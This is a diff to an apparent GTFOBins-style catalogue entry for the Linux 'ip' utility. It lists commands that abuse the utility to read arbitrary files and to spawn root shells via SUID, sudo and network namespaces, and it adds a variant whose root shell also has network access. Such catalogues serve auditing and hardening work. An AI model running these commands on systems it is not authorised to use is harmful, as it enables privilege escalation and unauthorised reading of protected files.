@@ -1,14 +1,15 @@
 {
-  "description": "The read file content is corrupted by error prints.\n",
   "functions": {
     "file-read": [
       {
-        "code": "ip -force -batch [file]\n"
+        
+        "code": "LFILE=file_to_read\nip -force -batch \"$LFILE\"\n"
       }
     ],
     "suid": [
       {
-        "code": "./ip -force -batch [file]\n"
+        
+        "code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"
       },
       {
         "description": "This only works for Linux with CONFIG_NET_NS=y.",
@@ -17,11 +18,16 @@
     ],
     "sudo": [
       {
-        "code": "sudo ip -force -batch [file]\n"
+        
+        "code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"
       },
       {
         "description": "This only works for Linux with CONFIG_NET_NS=y.",
         "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
+      },
+      {
+        "description": "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.",
+        "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
       }
     ]
   }
